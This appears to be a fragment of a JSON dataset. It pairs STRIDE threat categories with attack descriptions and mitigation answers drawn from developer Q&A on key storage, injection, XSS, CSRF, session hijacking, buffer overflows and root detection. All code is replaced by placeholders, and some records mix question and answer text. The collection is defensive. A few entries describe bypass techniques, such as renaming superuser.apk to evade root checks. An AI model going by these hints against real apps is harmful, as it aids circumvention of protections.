    "Attack": " However, once the user is logged in, there is the possibility for other users' processes on the same machine with sufficient privileges (generally only granted to administrative/system accounts) to access the stored keys, e.g. by  injecting code into a users process that will run I'm the context of the user and hence be able to do anything the user could do with the key (use it to decrypt, sign, or export the key, etc.). ",
    "Mitigation": " Enabling strong private key protection may mitigate some of these issues by requiring the user to enter a password for the key whenever it is used. Even with this, it would likely still be possible for malicious code to intercept the key's password. "
  },
  {
    "Threat": "T",
    "Attack": " I am getting SUBSCRIPTION_JSON from client which I am converting it to String and then setting it to Model Object using gson library. On running the code on Fortify security, It is giving me Json injection error on below code with following message : ",
    "Mitigation": " You must validate the json received to be sure it contais exactly the expected content before setting it to Model Object. You can implement an validator that checks the json with a patterns of fields/format expected, for example. "
  },
  {
    "Threat": "S",
    "Attack": " Suppose that a data source sets a tight IP-based throttle.  Would a web scraper have any way to download the data if the throttle starts rejecting their requests as early as 1% of the data being downloaded?  The only technique I could think of a hacker using here would be some sort of proxy system.  But, it seems like the proxies (even if fast) would eventually all reach the throttle. ",
    "Mitigation": " (I have seen IRC servers do a port scan on clients  to see if the following ports are open: 8080,3128,1080.  However there are proxy servers that use different ports and there are also legit reasons to run proxy server or to have these ports open, like if you are running Apache Tomcat.  You could bump it up a notch by using YAPH to see if a client is running a proxy server.  In effect you'd be using an attacker's too against them ;) "
  },
  {
    "Threat": "I",
    "Attack": " I'm making an android application and currently, I have my server username and password written as constants in my code (which is not very secure). I have researched online but I couldn't really find something that would completely secure the password from the user or at least prevent from hackers. Could anyone help me out on how to securely store a password locally on android? Thanks!  It seems your question is actually \"can I restrict server access to my application only?\". This is not possible. Once an application or file exists on a client (eg. a user device), there's no sure-fire way to prevent that client from accessing anything in that application or file, with or without your authorization. ",
    "Mitigation": " It seems your question is actually \"can I restrict server access to my application only?\". This is not possible. Once an application or file exists on a client (eg. a user device), there's no sure-fire way to prevent that client from accessing anything in that application or file, with or without your authorization.  If the device can read it, then the device can read it - regardless of whether it's actually your application doing the reading, or something else pretending to be the application.  The most you can do is trying to obfuscate the credentials, but this is unlikely to be useful - those who might have an interest in extracting credentials from your application, will also likely be those who have the skills to bypass such obfuscation.  I can't really give you a more specific suggestion without knowing your usecase. For remote APIs, API keys are typically used - but this would require that the user create an account. For account-less applications, what you want is simply not possible.  I should also note that \"preventing hackers\" is not a meaningful goal - that can mean many things. You'll want to read up on how threat modelling works, and determine exactly who your 'attackers' are, what their goals are, and what their capabilities are. Only then can you try to find solutions against it. "
  },
  {
    "Threat": "I",
    "Attack": " My question is, since the post data is sent over curl/ssl, can it be intercepted or stolen while in traffic? can the hacker view the session id in plain text(the most important component here)?   You do not want to implement this with PHP because this is easily achieved with webservers alone. Your Server A handling SSL ([LINK]) can act as an [LINK] and as a [LINK] to Server B. It's a common setup to divide responsibilites between servers. Research these topics please. ",
    "Mitigation": " You do not want to implement this with PHP because this is easily achieved with webservers alone. Your Server A handling SSL ([LINK]) can act as an [LINK] and as a [LINK] to Server B. It's a common setup to divide responsibilites between servers. Research these topics please.  You can pick from a variety of solutions for this, ranging from a free solutions like [LINK] or [LINK], etc.  And yes, when you use SSL, it is [LINK] (when in doubt, buy an audit). "
  },
  {
    "Threat": "S",
    "Attack": " A web application that once a new user completes the registration, an email will be sent, containing a URL that once tapped from within an iOS device, the iOS app will be launched. This scenario is a classic scenario to make users use the mobile app.  While implementing it (using URL scheme), we start wondering how secured is this method? Theoretically - a malicious app could sign up to the same URL scheme, and according to Apple: ",
    "Mitigation": " We have to assume the malicious app can intercept any data included in this url and that it's author has been free to reverse engineer any behavior included in your app so it can imitate your UI and any validation your app attempts to perform. However we can also assume that the malicious app is contained in its own sandbox so your app can communicate with your backend privately. The malicious app can imitate any such communication but this does allow us to construct a secret unknown to the malicious app. That gives us at least an opportunity to design some countermeasures.  One option might be:  As part of registration construct a public/private key pair and store it in your app.Send the public key to your web backend as part of the registration process.Encode they payload of your URL using that public key.  Now we've sent data to your app which might be redirected to a malicious app but which the malicious app cannot read. That's a partial solution. We still need to be careful to design a UI which does not encourage a user to fall for a phishing attack since the URL might still launch the imposter.  The encoded data might be a token we can use to authenticate the user and therefore never require them to re-authenticate within the app. Then there is no login screen to imitate (though a clever forgery might still be enough to trick users into divulging their credentials).  An alternative might be to use a similar per-user secret stored on the client as a salt to combine with the user's password. Their password alone might then be insufficient to authenticate so a malicious app capturing their credentials is not immediately able to access their account.  Another design could be to allow the user to customize their experience in a recognizable way. You might show their selected profile image on the sign in screen. If that selection is known only to your app then an imitator shouldn't be able to duplicate it reliably (again, no guarantee that means users will catch the deception).  All of this introduces tradeoffs; users might still be tricked into revealing information to malicious apps no matter how different they appear from your legitimate client, client side secrets can be extracted by other attacks, and you need a plan to support users who switch, lose, or upgrade devices. You have to decide if any of this actually improves the security of your users and if it is worth the cost to implement. "
  },
  {
    "Threat": "I",
    "Attack": " Is it safe to let users make their own Django templates with a set of pre-defined variables, and then render this template on the server? I would only pass a very limited set of parameters to [CODE], all of which are strings. Templates would be something like:  So, the question is, are there any django template tags that can be abused to get information that users are not supposed to get? I'm most worried about the [CODE] tag. ",
    "Mitigation": " There're three main risks:  Users modifying the data.  For example, rendering [CODE] will trigger [CODE] call during value lookup.  To prevent this, you should set [CODE] in your model code.  All built-in model methods that modify data are already marked, so the risk is only associated with your own methods or ones provided by poorly-written 3rd party apps.Users directly accessing data they should not see.  When [CODE] is used (which is most of the time), there're many variables added to template rendering context.  Add user-defined templates and you're getting quite dangerous mix, because user can view anything added by any context processor.Users accessing data they should not see through relations.  When you pass model instance to template, its relations could be travesred futher than you could expect:  [CODE]  Oops...A good preventive measure would be carefully reviewing your model relations to make sure you're not exposing something sensitive.  Overall, I'd say it is safe as long as you are aware of risks above and render user-supplied strings separately from regular templates.  And make sure you eplicitly forbid [CODE] template tags, as they can give away quite sensitive information.  Maybe you can play it safe and only allow variables and filters and forbid control tags altogether. "
  },
  {
    "Threat": "I",
    "Attack": " Absolutely no data is stored in my vuex state when the page loadsIf the user is logged in(or has info stored in [CODE] and therefore gets auto logged in) my vuex store retrieves all the info from a socket that requires authentication.Then the user logs out, But my vuex state save still retains all its data  This would be a security issue as not logged in people(or hackers) on a public pc could view what the state was before the user logged out.  Then call [CODE] when the user logs out. ",
    "Mitigation": " All objects stored in Vue act as an observable. So if the reference of a value is changed/mutated it triggers the actual value to be changed too.  So, In order to reset the state the initial store modules has to be copied as a value.  On logging out of a user, the same value has to be assigned for each module as a copy.  This can be achieved as follows:  [CODE]  Then call [CODE] when the user logs out. "
  },
  {
    "Threat": "S",
    "Attack": " However, isn't this open to a [CODE] attack? If sending a temporary passwords over the internet to an email is insecure, what's the difference between doing that and simply sending a unique URL which the attacker can navigate to? Have I missed a key step somewhere that will make this system more secure (Or is there a better way of resetting the password)? ",
    "Mitigation": " If you construct your hash correctly, the url click will have to come from the IP address that requested the reset. This would require the MITM to spoof the IP and/or falsify headers. While this is possible, the more unique you can identify the hash to the system in question, the more difficult it becomes to \"end-around\" the hash.  It is also recommended that the guid be a one-way hash of certain criteria. It is also possible to encrypt system data in the request using a public key that a private key unlocks so that when the url is clicked, this same public encrypted system data must accompany the hash, and the only system that could unencrypt these values would be the private key held at the server. Basically a psuedo-PKI attachment to the hash. "
  },
  {
    "Threat": "T",
    "Attack": " I validated my client's website to xHTML Strict 1.0/CSS 2.1 standards last week. Today when I re-checked, I had a validation error caused by a weird and previous unknown script. I found this in the index.php file of my ExpressionEngine CMS. Is this a hacking attempt as I suspected? I couldn't help but notice the Russian domain encoded in the script...  [CODE]  Yes. The site has been compromised.  ",
    "Mitigation": " Ensure that everyone who had access to those passwords run an updated virusscan on computers that they may have logged into the site from.   Ensure that you change all login and admin passwords.  If possible you should likely revert to the codebase as it was prior to you coming across this.Check the modification time of the script where you found this snippet (if it isn't too late) and look for other files that have been changed around that time. The script is likely randomly generated so grepping for parts of it is unlikely to be conclusive.   If this script was able to find its way in, then so can others. It is not uncommon that web sites are compromised via keylogging trojans on the computers of those who log into them.See [LINK] "
  },
  {
    "Threat": "I",
    "Attack": " Currently I'm storing API Keys in my app. Which yes is a bad practice. Now to the best of my knowledge I can use ProGaurd or DexGaurd to obfuscate. I can also use Keystore to securely store my api keys. Now for this part here' my question:- Obfuscation changes the name of variables and classes. My API Key will still be in that app when someone decompiles the apk file. Sure it might take more time, but how much more is it? For example 20 minutes? I feel like the bottom line is that they can use this key if they put some time and effort. Am I getting this wrong?  How is that even possible? A server is going to send the api key to the app. If the hacker finds this url they can just open it and get the key. If I use a key to access the URL then i'm entering a never ending loop of keys. How would I do this?Someone said that I can encrypt my keys and then decrypt them in the app once it's received. But can't people decompile my decryption function and figure out my key? ",
    "Mitigation": " If you think API Key should not be compromised then you should not put it inside the app. You can use the following possible solutions <br/>  You can keep your keys on a server and route all requests needing that key through your server. So as long as your server is secure then so is your key. Of course, there is a performance cost with this solution. You can use SSL pinning to authenticate the response. Check [LINK]<br/>You can get the signature key of your app programmatically and send is to sever in every API call to verify the request. But a hacker can somehow find out the strategy.Google does not recommend storing API keys in remote config but you can keep one token there and use it to verify the request and send the API key. Check [LINK] In the case of the Android app, you can use SafetyNet API by Google to verify the authenticity of the app and the server can generate a token for the user after verification of the SafetyNet response. The token can be further used to verify the request. There is one [LINK] available for Flutter for SafetyNet API.  You can use a combination of the above approaches to ensure the security of the API key. To answer your questions, Firebase remote config uses SSL connection to transfer the data, it's very much secure but you should not rely on it completely for your data security. You also can't share API keys using the APIs which are publicly accessible. Moreover, storing both the encrypted key and the data inside the app won't make it secure. "
  },
  {
    "Threat": "T",
    "Attack": " From all the posts that I've seen so far, I'm uncertain as to whether it is safe to send the IV in \"plaintext\" by prepending it to the cipher text. So the first question is, is it safe to do so?   That being said though, you need to make sure you MAC it. Depending on how you do message authentication codes, someone tampering with the IV could tamper with the resulting plaintext on decryption. Encryption alone does not provide integrity of messages. ",
    "Mitigation": " Yes, it is safe to send the IV in the clear. Here is the 'proof' of why:  Take CBC mode for example:    You can see that the ciphertext of a block is XORed with the plaintext of the next block. The reason we need an IV is because on the first block, there is no previous ciphertext to use. If there was a security risk with having the IV be secret, then the security risk would be present for every block after, since the ciphertext serves the same role as the IV.   That being said though, you need to make sure you MAC it. Depending on how you do message authentication codes, someone tampering with the IV could tamper with the resulting plaintext on decryption. Encryption alone does not provide integrity of messages.  Also, for IV generation, it depends on your requirements. But most often, your IV needs to be random and non-predictable.  "
  },
  {
    "Threat": "I",
    "Attack": " what are the ideas of preventing buffer overflow attacks? and i heard about Stackguard,but until now is this problem completely solved by applying stackguard or combination of it with other techniques?    Why do you think that it is so  difficult to provide adequate  defenses for buffer overflow attacks? ",
    "Mitigation": " There's a bunch of things you can do.  In no particular order...  First, if your language choices are equally split (or close to equally split) between one that allows direct memory access and one that doesn't , choose the one that doesn't.  That is, use Perl, Python, Lisp, Java, etc over C/C++.  This isn't always an option, but it does help prevent you from shooting yourself in the foot.  Second, in languages where you have direct memory access, if classes are available that handle the memory for you, like std::string, use them.  Prefer well exercised classes to classes that have fewer users.  More use means that simpler problems are more likely to have been discovered in regular usage.  Third, use compiler options like ASLR and DEP.  Use any security related compiler options that your application offers.  This won't prevent buffer overflows, but will help mitigate the impact of any overflows.  Fourth, use static code analysis tools like Fortify, Qualys, or Veracode's service to discover overflows that you didn't mean to code.  Then fix the stuff that's discovered.  Fifth, learn how overflows work, and how to spot them in code.  All your coworkers should learn this, too.  Create an organization-wide policy that requires people be trained in how overruns (and other vulns) work.  Sixth, do secure code reviews separately from regular code reviews.  Regular code reviews make sure code works, that it passes functional tests, and that it meets coding policy (indentation, naming conventions, etc).  Secure code reviews are specifically, explicitly, and only intended to look for security issues.  Do secure code reviews on all code that you can.  If you have to prioritize, start with mission critical stuff, stuff where problems are likely (where trust boundaries are crossed (learn about data flow diagrams and threat models and create them), where interpreters are used, and especially where user input is passed/stored/retrieved, including data retrieved from your database).  Seventh, if you have the money, hire a good consultant like Neohapsis, VSR, Matasano, etc. to review your product.  They'll find far more than overruns, and your product will be all the better for it.  Eighth, make sure your QA team knows how overruns work and how to test for them.  QA should have test cases specifically designed to find overruns in all inputs.  Ninth, do fuzzing.  Fuzzing finds an amazingly large number of overflows in many products. "
  },
  {
    "Threat": "T",
    "Attack": " When creating apps that put data to a database is mysql_real_escape_string and general checking (is_numeric etc) on input data enough? What about other types of attacks different from sql injection. ",
    "Mitigation": " My recommendations:  ditch mysqli in favor of [LINK] (with mysql driver)use PDO paremeterized prepared statements  You can then do something like:  [CODE]  PROs:  No more manual escaping since PDO does it all for you!It's relatively easy to switch database backends all of a sudden. "
  },
  {
    "Threat": "T",
    "Attack": " I want to display user uploaded SVG images on a website, but they're quite open to exploits:  They serve the uploaded files from a separate hostname, specifically [CODE]. You can cross-site-script into there all you like but it doesn't get you anything: it lives in a different origin to [CODE] and can't touch its cookies or interact with its script. ",
    "Mitigation": " They serve the uploaded files from a separate hostname, specifically [CODE]. You can cross-site-script into there all you like but it doesn't get you anything: it lives in a different origin to [CODE] and can't touch its cookies or interact with its script.  This is ultimately the only airtight way to handle file uploads, and what most of the big players do. It is just too difficult to do a thorough scan for all the many obscure XSS possibilities that exist when you allow arbitrary files.    Can I simply trust [CODE]?  It doesn't really matter what [CODE] does\u9225\u6516he user can simply be navigated directly to the SVG address and it'll execute script full-page in the site's origin. "
  },
  {
    "Threat": "I",
    "Attack": " I am using a SHA-512 hash 1000 times on a salt + password. Is it safe to return that when querying information about a user or should I secure it and make it available only over HTTPS?  Passwords can be cracked. Given a hash and knowledge of how the hash was constructed, you can bruteforce the relevant parameters. Even though it takes 1000 times longer, and the salt might have to be bruteforced (if not included in the query response), the possibility still exists (and someone patient enough, with the right resources, might just do it if the value was high enough). Don't take the risk -- just don't disclose the password in any form. ",
    "Mitigation": " Why would you ever return a user's password in response to any public-facing query? It doesn't matter what form the password is returned in -- this is fundamentally insecure!  Passwords can be cracked. Given a hash and knowledge of how the hash was constructed, you can bruteforce the relevant parameters. Even though it takes 1000 times longer, and the salt might have to be bruteforced (if not included in the query response), the possibility still exists (and someone patient enough, with the right resources, might just do it if the value was high enough). Don't take the risk -- just don't disclose the password in any form. "
  },
  {
    "Threat": "I",
    "Attack": " But if the database where compromised the attacker is going to defeat [CODE] by enabling the [LINK]. ",
    "Mitigation": " Using the user's password for encryption should be avoided,  you should be using a crypgoraphic nonce.  If you do use a password make sure you use a String2Key funciton. You must also use CBC or CMAC mode with a [LINK].  I don't really see how asymmetric cryptography can help.  Asymmetric cryptography is very slow,  memory intensive.  They data that it protects is made less secure when the attacker controls the message because you can compare cipher text messages.  This is why an random IV [LINK],  and in the asymmetric world you don't have this level of protection.   Key Generation should look something like:[CODE]  Make sure the output of your string2key function is the same size as your keyspace.  So aes 128 needs a 128bit key. Each password should have its own [CODE],  and the [CODE] is a cryptographic nonce stored in textfile.  (An attacker would have to read this file before he can crack the key,  if this value is large like 128 bits then its a moot point.)   Each message needs its own [CODE] and this value must also be a cryptographic nonce (similar to a salt).  I would generate the [CODE],[CODE] and [CODE] from [CODE].  The IV can be stored in plain text in a column in your database along with the cipher text.   From a legal standpoint even if you build a secure cryptogrpahic  system you still have problems with insider threats and if the server is completely compromised,  all of the data will still be compromised.   This really isn't an engineering problem.   The best defense against a legal threat is a strong Terms and Conditions written by a skilled lawyer. "
  },
  {
    "Threat": "S",
    "Attack": " My concern is that when the web-server goes down for any reason (or becomes inaccessible eg a network cable being disconnected somewhere). When the user hits logout, there is actually no way of removing the cookie. Meaning that the user may walk away from the PC, meanwhile another user could come along when the connection is restored or server comes back, and just continue using the previous users account. ",
    "Mitigation": " If I were tasked with something like this, and downtime was a given, I'd probably do something like adding a second cookie, modifiable through JS (let's call it cookiever), which would contain some value that is used as a part of the HMAC signature on the http cookie, ie (pseudocode):  [CODE]  Normally, cookiever would be set by the server along with the httponly cookie, and is used to validate the cookie on each request. If the user were to request a logout, then you would use Javascript to write an empty value to cookiever, destroying the signing information in the cookie. Thus, even if the httponly cookie can't be destroyed, the cookiever cookie would, and on the next successful request, the httpcookie would fail to validate its HMAC signature, and your server would discard it and force the user to start a new session. "
  },
  {
    "Threat": "I",
    "Attack": " Assume that I have a code having buffer overflow vulnerability as following  Is there a way to exploit this vulnerability if its getting input from another function (not user input) and the length of str is always less than 100?  But that doesn't mean you should leave it unfixed. While there is no physical vulnerability, there is a lot of potential for a vulnerability. Now you don't pass anything longer than 100 characters. But what about a few months from now on? Will you remember that you can only pass input shorter than 100 characters? I don't think so. ",
    "Mitigation": " choosing to hold [CODE] in [CODE] (but this won't circumvent buffer overflow if variable is longer than 4GB)using a dynamically allocated buffer and checking if you managed to [CODE] it successfullyusing [CODE] together with [CODE] rather than [CODE]passing [CODE] as a second parameter (probably annoying) "
  },
  {
    "Threat": "E",
    "Attack": " The major techniques used by developers in root detection are checking for the superuser.apk file,check for chainfire,busybox,executing su command,etc. But an attacker can simply bypass these checks by several means like renaming the superuser.apk to superuser0.apk.  ",
    "Mitigation": " There is not \"the single solution\" as far as I know but you will need to check for the most common things. The following article is also useful:[LINK]  And here are some tips ... also what you should not do:[LINK] "
  },
  {
    "Threat": "D",
    "Attack": " For those who used Google Protocol Buffers C++ implementation, how does it deal with malicious or malformed messages? Does it crash or continues to operate for example?  My app will certainly receive malicious data at some point and I don't want it to crash every time a malformed message is received. This is the only answer I could find on this issue ([LINK]). ",
    "Mitigation": " One area of attack you might want to close down yourself is in the framing of protobuf data - protocol buffers themselves do not serialise the overall size of the serialised message to the stream in any kind of standardised header, so you may want to (as I do) wrap all protocol buffer messages in a frame. For my purposes the frame header simply contains a message size, which means I am able to determine the memory requirements of the message prior to attempting to read it off the wire, let alone decode it.   A simple check could be made at this point to reject messages (or drop the connection) if the size is unfeasibly large.  Further work can be done to wrap this frame in a public key enveloping scheme in order to prevent man-in-the-middle hijacking of your session if that is a concern.  Buffer overruns within a message (for example a string getting too long) cannot happen because [CODE] and [CODE] fields are internally represented by [CODE], which automatically grows its memory footprint as data is appended to it.  However:  There is no guarantee that malicious clients will not seek to encode valid messages that contain invalid data. For example, if your server application takes a method name from data string, looks up its address and calls it then this is an obvious vector for attack.  You should never allow client data to find server code without a comprehensive check that the operation is specifically allowed.  Some examples of this that one must never do:  allow the client to send you SQL in a text fieldallow the client to send you command-lines which you subsequently pass to [CODE], [CODE], [CODE] etc...allow the client to send you the name of a shared library and a function name within it... "
  },
  {
    "Threat": "T",
    "Attack": " How to prevent SQL injection? ",
    "Mitigation": " From the [LINK]:  [CODE]  If you scroll down a bit farther, there are [LINK].  You should also read the [LINK]  for a more thorough overview of SQL escaping in WordPress. "
  },
  {
    "Threat": "T",
    "Attack": " I attached a yellow screen of death that I encountered on one of the websites that I created a long time ago and it sparked my interest.(The error is that it fails when attempting to cast a query string parameter to an int.  Yea, I know its bad code, I wrote it many years ago ;)  Say, for example, you have written your own forum software. You have put in lots of validation for when the user writes posts to prevent XSS attacks and such, but your validation is faulty. If a hacker can bring up the YSOD when they make a post, the stack trace shown could potentially show them the cracks in your validation and exploit them to create XSS attacks or obtain member details or passwords and such. ",
    "Mitigation": " If you're writing secure code, the YSOD shouldn't provide a hacker with the ability to hack your application. If however, your code is insecure, then the YSOD could provide the attacker with essential information to allow them to carry out their attack.  Say, for example, you have written your own forum software. You have put in lots of validation for when the user writes posts to prevent XSS attacks and such, but your validation is faulty. If a hacker can bring up the YSOD when they make a post, the stack trace shown could potentially show them the cracks in your validation and exploit them to create XSS attacks or obtain member details or passwords and such.  The YSOD on it's own is no threat, but to a hacker, it can be a very useful way of finding flaws in your application's security. "
  },
  {
    "Threat": "I",
    "Attack": " Oh, and yes I am not referring to other kinds of attacks which use return-to-libc, ptrace etc. ; I just wish to know why the most basic buffer overflow attack is demonstrated in the first way and not the second everywhere. ",
    "Mitigation": " This simplistic stack-based buffer overflow exploit will not work on a modern system.  Alpeh-One's Smashing The Stack For Fun and Profit no longer works because of NX zones,  stack canaries, and ASLR,  all of which are default on Windows and Linux.    "
  },
  {
    "Threat": "T",
    "Attack": " But my question is , I dont understand how does this prevent csrf attacks in json format? Attacker can always send a json request to our endpoint from their site. Anyone has insights into this? I couldn't find any clear answer to this. ",
    "Mitigation": " What you are describing is very easy to exploit using Flash:[CODE]If you look at the [LINK]  you can check the referer to make sure its from a domain you trust.  If the referer is blank then it could be originating from a https url,  so that should be considered a failure.  Relying on Ruby's CSRF token is a stronger form a CSRF protection. "
  },
  {
    "Threat": "T",
    "Attack": " Before reaching server a hacker modified form data(first name &amp; last name) leaving token info unchanged. ",
    "Mitigation": " The basic threat is the following. A victim user is logged on to the victim website victim.com. Meanwhile (say in another browser tab) he visits a malicious website malicious.com that wants to exploit CSRF in victim.com. For that, malicious.com has the user post the required parameters to victim.com to call a certain function which obviously victim user did not want to perform. This is the base case of CSRF, exploiting an existing user session, malicious.com performed something on victim.com via a victim user.  This is prevented, if for example antiforgerytoken is used, because malicious.com will not be able to send the right token to victim.com, so the request will be denied.  Note that this has nothing to do with legitimate request content.  <h3>Integrity of requests</h3>  A different problem is making sure the request is received as sent, ie. data is the same. This is usually achieved by using HTTPS, which provides message integrity and encryption (among others). So if HTTPS is used, such change of data in transit is not possible.  Of course if the attacker controls either the client or the server (more precisely, the TLS endpoint, which is not always the server), ie. anything outside the TLS channel, then the attacker can modify data. But that would mean having control over the client. For example you can do this if you run a local proxy (Fiddler, Burp, ZAP Proxy, etc.) on your client - you can then change any data in the request, that's how penetration testers work. However, an attacker not having this level of control would not be able to do this.  Without HTTPS, request (and btw also response) integrity and encryption are problems that are hard to solve. The solution is HTTPS. :) "
  },
  {
    "Threat": "I",
    "Attack": " With the cycript technology, all iOS application are able to debug and able to access variables and methods inside application.   And also it is possible to overwrite the runtime variables and methods.     With the cycript technology, all iOS application are able to debug and able to access variables and methods inside application. And also it is possible to overwrite the runtime variables and methods. ",
    "Mitigation": " There is no 100% safe way. As someone said once you can't stop every hacker, but you can slow down and discourage most of them. Then if you protect your app against some types of attacks your app will stand a tiny bit longer without being hacked.   For iOS development, there is one thing to remember : Objective-C (and Swift) make it really easy for hackers  to manipulate the runtime and do static analysis. In brief detail : this is due to the way in which these languages are compiled and organized in the binary.  Since it is a due to the language, you can use other languages in order to avoid this ! That's why it is recommended to use other languages like C/C++ instead of Objective-C/Swift for security-related code which process sensitive informations. For instance, Cycript cannot access C/C++ code and thus cannot modify an environment coded in those languages.  Practically, if you use cross-platform tools to develop your apps (like Cocos2d, Unity, ...) you may be protected against such debugger-based attacks (like Cycript, GDB) because most of these cross-platform dev tools only use Objective-C / Swift for the very first steps when the application launches, and they compile your app logic in whatever language you develop in (e.g. C++ for Cocos2d and Unity). "
  },
  {
    "Threat": "I",
    "Attack": " So I am encrypting data, storing it in the database, and decrypting it, using mcrypt.I am wondering if it's safe to store the key for encryption in a php file outside of the public_html directory?  What are ANY potential security risks? Is it at ALL possible for a hacker to gain access to this file and thus the key?  If your server (as in its OS) is compromised, it is \"game over\", no matter whether your key is stored in a file or the database. So yes, it is \"at all possible for a hacker to gain access to this file and thus the key\" - by breaking into your server's OS. ",
    "Mitigation": " If your server (as in its OS) is compromised, it is \"game over\", no matter whether your key is stored in a file or the database. So yes, it is \"at all possible for a hacker to gain access to this file and thus the key\" - by breaking into your server's OS.  If apache or PHP are compromised, but not the OS, you end up in a chicken-and-egg problem: If you put your key somwhere, where apache/PHP can access it, it can be taken by whoever breaks into apache/PHP. If not, you can't use it in your webapp.  This leaves only a scenario, where your webapp is compromised, but not the surrounding infrastructure - in this case, a file might indeed be a good idea: Many break-ins (e.g. most of the SQL injection variant) gain access to the DB, but not to the file system.  For sensitive environments we sometimes chose a model, where encryption/decryption is handled via a pair of FIFOs, with the real crypto being done by an external process - this can do some heuristics and refuse decryption on suspicious patterns. "
  },
  {
    "Threat": "S",
    "Attack": " My question is: why use all these cookie for authentication? My guess would be that maybe generating a session hash would be to easy so using the hashedpassword and userid adds security but what about cookie spoofing? I'm basically leaving on the client all fundamental informations.  My main concern is about these solution giving to much information when under a cookie spoofing attack. ",
    "Mitigation": " This happens because session and login cookies may have different lifecycles.  Imagine website with millions of users every day. The website won't store your session for a year just to log you back the next time you get back.They use login cookies for that.  These cookies are also called Remember-Me cookies. "
  },
  {
    "Threat": "I",
    "Attack": " My web application operates only over SSL and sets a time limited cookie for each user after they successfully login with a username and password. The biggest weaknesses in the system are one compromising an existing user's cookie. And two guessing a session ID GUID.   I know of mechanisms for the first weakness but I'm wondering how much I need to worry about the chance of an attacker guessing a session ID GUID based on a GUID they have previously obtained by logging into an account they have set up? The web server in this case is Windows 2003 and the GUIDs are being generated with .Net 3.5. ",
    "Mitigation": " GUIDs are not intended to be cryptographically secure, just unique.  Quite a lot of the format is predictable - 48 bit MAC address, a timestamp that is somewhat predictable if you know how it's generated and another few bits to deal with timestamp collisions.  A technically sophisiticated attacker has a pretty good chance of reverse engineering a GUID.  You really need a [LINK] for a secure session key. "
  },
  {
    "Threat": "S",
    "Attack": " Is it really a foolproof method of preventing replay attacks? ",
    "Mitigation": " A timestamp by itself wouldn't be sufficient, but usually it is combined with a hashing mechanism to guarantee that the values haven't been tampered with.  The idea is that the client generates the parameters, and uses their private key to hash the parameters. The [hash + original values + public key] are then sent with the request. The server can use the public key to look up the private key, and ensure that the parameters are correct.  The timestamp is used, along with some threshold, to ensure that particular request can't be used more than once. If the threshold is small (a few hundred milliseconds) then a replay attack is virtually impossible. "
  },
  {
    "Threat": "S",
    "Attack": " So you've performed the login using https to prevent man in the middle attacks and make sure your password isn't sent in the clear. Good call. But many sites then switch back to http for the rest of the session.  Once you're exchanging everything in the clear can't a man in the middle begin hijacking your session again? Okay, so they don't have your password but they don't need it! For as long as you stay logged in the man in the middle can just hijack your session and send whatever requests they want. Can't they? ",
    "Mitigation": " Therefore running most of a site in the clear has traditionally been considered an \"acceptable risk\" for most uses of the web.   The two risks you face are having your data be visible to others, and having others be able to act as you (by using your cookies, which they can steal). When designing a new site, you should think about the relative risks of both of these things. Notice that financial institutions will always serve all of their pages over HTTPS because the risk is not acceptable-- every page contains sensitive data, and even eavesdropping is bad. Gmail provides an opt-in option to get HTTPS for all sessions, too. (Facebook doesn't, though, nor does e.g. Yahoo! Mail).    You've probably noticed that many sites that run primarily over HTTP will protect critical settings changes with password re-authentication. This is one reason why they do this: even if the guy in the coffee shop can read your Facebook posts going by, he can't change your password and lock you out without knowing your current password.  Philosophically, my guess is that over time an increasing number of services with private user data will be pressured to move to (or offer) all-HTTPS as people become aware of the risks and as use of public Wifi networks increases. "
  },
  {
    "Threat": "S",
    "Attack": " As far as I can see this should prevent a man-in-the-middle attack, or am I missing something?At point 7 the client should know if someone is trying to give the server the wrong key to encrypt with, as no one else but the server can decrypt key2(public). ",
    "Mitigation": " The best thing you can do to improve the security is to use an existing design and not try to reinvent the wheel. I'm not saying that what you've done is necessarily wrong, but just that many people much smarter than you and me have spent a lot of time thinking about this problem. Use TLS instead. "
  },
  {
    "Threat": "S",
    "Attack": " The major concern I have is that anyone could inspect the requests being made by a legitimate client to the API and steal the OAuth client_id. At that point they would be able to construct any request they want to impersonate the legitimate client. ",
    "Mitigation": " You can deploy mutually-authenticated SSL between your legitimate clients and your API. Generate a self-signed SSL client certificate and store that within your client. Configure your server to require client-side authentication and only accept the certificate(s) you've deployed to your clients. If someone/something attempting to connect does not have that client certificate, it will be unable to establish an SSL session and the connection will not be made. Assuming you control the legitimate clients and the servers, you don't need a CA-issued certificate here; just use self-signed certificates since you control both the client-side and server-side certificate trust.  Now, you do call out that it's really hard to prevent someone from reverse engineering your client and recovering your credential (the private key belonging to the client certificate, in this case). And you're right. You'll normally store that key (and the certificate) in a keystore of sometype (a [CODE] if you're using Android) and that keystore will be encrypted. That encryption is based on a password, so you'll either need to (1) store that password in your client somewhere, or (2) ask the user for the password when they start your client app. What you need to do depends on your usecase. If (2) is acceptable, then you've protected your credential against reverse engineering since it will be encrypted and the password will not be stored anywhere (but the user will need to type it in everytime). If you do (1), then someone will be able to reverse engineer your client, get the password, get the keystore, decrypt the private key and certificate, and create another client that will be able to connect to the server.   There is nothing you can do to prevent this; you can make reverse engineering your code harder (by obfuscation, etc) but you cannot make it impossible. You need to determine what the risk you are trying to mitigate with these approaches is and how much work is worth doing to mitigate it.  "
  },
  {
    "Threat": "T",
    "Attack": " I am creating a forum software using php and mysql backend, and want to know what is the most secure way to escape user input for forum posts. ",
    "Mitigation": " When generating HTLM output (like you're doing to get data into the form's fields when someone is trying to edit a post, or if you need to re-display the form because the user forgot one field, for instance), you'd probably use [LINK] : it will escape [CODE], [CODE], [CODE], [CODE], and [CODE] -- depending on the options you give it.  [CODE] will remove tags if user has entered some -- and you generally don't want something the user typed to just disappear ;-)At least, not for the \"content\" field :-)    Once you've got what the user did input in the form (ie, when the form has been submitted), you need to escape it before sending it to the DB.That's where functions like [CODE] become useful : they escape data for SQL  You might also want to take a look at prepared statements, which might help you a bit ;-)[LINK] - and [LINK]  You should not use anything like [CODE] : the escaping it does doesn't depend on the Database engine ; it is better/safer to use a function that fits the engine (MySQL, PostGreSQL, ...) you are working with : it'll know precisely what to escape, and how.    Finally, to display the data inside a page :  for fields that must not contain HTML, you should use [LINK] : if the user did input HTML tags, those will be displayed as-is, and not injected as HTML.for fields that can contain HTML... This is a bit trickier : you will probably only want to allow a few tags, and [LINK] (which can do that) is not really up to the task (it will let attributes of the allowed tags)  You might want to take a look at a tool called [LINK] : it will allow you to specify which tags and attributes should be allowed -- and it generates valid HTML, which is always nice ^^This might take some time to compute, and you probably don't want to re-generate that HTML each time is has to be displayed ; so you can think about storing it in the database (either only keeping that clean HTML, or keeping both it and the not-clean one, in two separate fields -- might be useful to allow people editing their posts ? )  Those are only a few pointers... hope they help you :-)Don't hesitate 